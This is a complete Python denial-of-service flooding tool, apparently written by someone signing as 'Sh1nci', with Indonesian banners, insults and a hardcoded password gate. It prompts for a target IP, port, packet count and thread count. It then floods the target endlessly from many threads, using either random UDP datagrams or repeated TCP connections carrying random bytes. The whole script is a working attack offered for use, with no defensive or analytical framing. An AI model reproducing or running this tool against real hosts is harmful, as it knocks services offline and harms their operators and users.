#!/usr/bin/env python3
#Code By Sh1nci
import time
import random
import socket
import threading
import os

os.system("clear")
password ="SH1NCINOTABUSE"

for i in range(3):
	pwd = input("[▪] PASSWORD: ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("[▪] TUNGGU 5 DETIK!!! ")
		break
	else:
		time.sleep(5)
		print("[×] Password Lu Salah Bego!!! ")
		continue
time.sleep(5)
print("{√} Nah Baru Bener Password-nya ")
time.sleep(5)

print("══》 Tools Ddos By Sh1nci《══")
print("###############")
print("══》Author : Sh1nci《══")
print("══》Jangan Abuse Ya Sayang 《══")
print("══》Kalo Sampe Abuse Gw Bacok Lu 《══")
print("══》TR Team |")
print("###############")

ip = str(input("══》IP TARGET:"))
port = int(input("══》PORT TARGET:"))
choice = str(input("══》YAKIKN CIL MAU DI DDOS?(y/n):"))
times = int(input("══》PACKETS DDOS:"))
threads = int(input("══》THREADS DDOS:"))
def run():
	data = random._urandom(9904)
	i = random.choice(("[&]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PACKET SENT TO SERVER FROM SH1NCI!!!")
		except:
			print("[!] Mampus Down Lu Ngentot!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[&]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PACKET SENT TO SERVER FROM SH1NCI!!!")
		except:
			s.close()
			print("[*] Mampus Down Lu Ngentot")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()